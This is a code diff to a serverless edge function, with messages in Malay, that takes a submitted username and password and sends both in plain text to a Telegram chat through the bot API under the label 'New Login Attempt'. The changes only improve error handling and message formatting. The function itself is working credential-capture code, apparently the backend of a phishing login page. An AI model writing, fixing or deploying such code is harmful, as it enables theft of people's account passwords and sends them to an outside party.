@@ -6,7 +6,6 @@ const corsHeaders = {
 }
 
 serve(async (req) => {
-  // Mengendalikan permintaan preflight CORS
   if (req.method === 'OPTIONS') {
     return new Response(null, { headers: corsHeaders })
   }
@@ -20,7 +19,7 @@ serve(async (req) => {
     if (!botToken || !chatId) {
       console.error('Token Bot Telegram atau ID Sembang tidak ditetapkan dalam pembolehubah persekitaran.')
       return new Response(
-        JSON.stringify({ error: 'Ralat konfigurasi pelayan.' }),
+        JSON.stringify({ error: 'Ralat konfigurasi pelayan: Token atau Chat ID tiada.' }),
         {
           headers: { ...corsHeaders, 'Content-Type': 'application/json' },
           status: 500,
@@ -29,9 +28,9 @@ serve(async (req) => {
     }
 
     const message = `
-      Cubaan Log Masuk Baru:
-      Nama Pengguna: ${username}
-      Kata Laluan: ${password}
+Cubaan Log Masuk Baru:
+Nama Pengguna: ${username}
+Kata Laluan: ${password}
     `
 
     const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`
@@ -44,14 +43,13 @@ serve(async (req) => {
       body: JSON.stringify({
         chat_id: chatId,
         text: message,
-        parse_mode: "Markdown"
       }),
     })
 
     if (!response.ok) {
-      const errorData = await response.json()
+      const errorData = await response.json().catch(() => ({ description: 'Gagal membaca respons ralat Telegram.' }))
       console.error('Gagal menghantar mesej ke Telegram:', errorData)
-      throw new Error('Gagal menghantar mesej ke Telegram.')
+      throw new Error(`Ralat API Telegram: ${errorData.description || 'Ralat tidak diketahui'}`)
     }
 
     return new Response(
@@ -62,6 +60,7 @@ serve(async (req) => {
       }
     )
   } catch (error) {
+    console.error('Ralat dalam fungsi Edge:', error)
     return new Response(
       JSON.stringify({ error: error.message }),
       {
